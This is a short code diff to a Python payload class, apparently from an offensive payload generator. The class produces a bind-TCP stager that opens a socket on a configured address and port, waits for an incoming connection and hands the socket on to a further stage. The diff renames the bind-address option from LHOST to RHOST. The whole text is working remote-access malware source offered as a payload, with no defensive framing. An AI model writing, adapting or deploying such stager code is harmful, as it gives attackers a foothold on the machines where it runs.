@@ -18,7 +18,7 @@ class Payload(PythonPayload):
         
         # optional
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options["LHOST"] = ["0.0.0.0", "The target address"]
+        self.required_options["RHOST"] = ["", "The listen target address"]
         self.required_options["LPORT"] = ["4444", "The listen port"]
         
         
@@ -56,7 +56,7 @@ class Payload(PythonPayload):
         payloadCode += "\t\tglobal %s\n" %(clientSocketName)
         # build the socket and connect to the handler
         payloadCode += "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
-        payloadCode += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["LHOST"][0],self.required_options["LPORT"][0])
+        payloadCode += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["RHOST"][0],self.required_options["LPORT"][0])
         payloadCode += "\t\t%s.listen(1)\n" % (socketName)
         payloadCode += "\t\t%s,_ = %s.accept()\n" % (clientSocketName, socketName)
         # pack the underlying socket file descriptor into a c structure
